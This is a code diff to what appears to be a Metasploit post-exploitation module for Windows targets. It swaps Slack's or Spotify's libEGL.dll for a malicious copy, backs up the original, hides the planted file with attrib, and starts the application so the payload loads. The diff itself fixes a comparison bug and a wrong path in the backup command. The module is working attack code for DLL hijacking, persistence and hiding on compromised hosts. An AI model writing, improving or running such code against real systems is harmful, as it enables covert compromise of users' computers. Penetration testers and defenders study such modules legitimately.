@@ -157,7 +157,7 @@ def ls_stage1
   end
 
   # chose were to deploy payload (slack OR spotify)...
-  if datastore['SPOTIFY'] == true
+  if datastore['SPOTIFY'] == 'true'
      d_path = "%APPDATA%\\Spotify" # remote path on target system (spotify)
      s_name = "Spotify.exe" # service executable
   else
@@ -168,9 +168,9 @@ def ls_stage1
     # check if original libEGL.dll exist in target
     if client.fs.file.exist?("#{d_path}\\#{p_name}")
       print_warning(" Vulnerable dll agent: #{p_name} found...")
-      # backup original dll
+      # backup original dll using cmd.exe COPY command...
       print_good(" Backup original slack dll...")
-      r = session.sys.process.execute("cmd.exe /c COPY /Y #{d_name}\\#{p_name} #{d_path}\\libEGL.bk", nil, {'Hidden' => true, 'Channelized' => true})
+      r = session.sys.process.execute("cmd.exe /c COPY /Y #{d_path}\\#{p_name} #{d_path}\\libEGL.bk", nil, {'Hidden' => true, 'Channelized' => true})
       sleep(1.0)
 
       # upload our malicious libEGL.dll into target system..
@@ -180,11 +180,11 @@ def ls_stage1
       print_good(" Uploaded : #{u_path} -> #{d_path}\\#{p_name}")
       sleep(1.0)
 
-      # change attributes of libEGL.dll to hidde it from site...
-      print_good(" Use attrib command to hidde dll...")
-      r = session.sys.process.execute("cmd.exe /c attrib +h +s #{d_path}\\#{p_name}", nil, {'Hidden' => true, 'Channelized' => true})
-      print_good(" Execute => cmd.exe /c attrib +h +s #{d_path}\\#{p_name}")
-      sleep(1.0)
+        # change attributes of libEGL.dll to hidde it from site...
+        print_good(" Use attrib command to hidde dll...")
+        r = session.sys.process.execute("cmd.exe /c attrib +h +s #{d_path}\\#{p_name}", nil, {'Hidden' => true, 'Channelized' => true})
+        print_good(" Execute => cmd.exe /c attrib +h +s #{d_path}\\#{p_name}")
+        sleep(1.0)
 
           # start remote malicious service
           print_status("Sart remote slack service...")
@@ -238,7 +238,7 @@ def ls_stage2
 
 
   # chose were to deploy payload (slack OR spotify)...
-  if datastore['SPOTIFY'] == true
+  if datastore['SPOTIFY'] == 'true'
      d_path = "%APPDATA%\\Spotify" # remote path on target system (spotify)
      s_name = "Spotify.exe" # service executable
   else
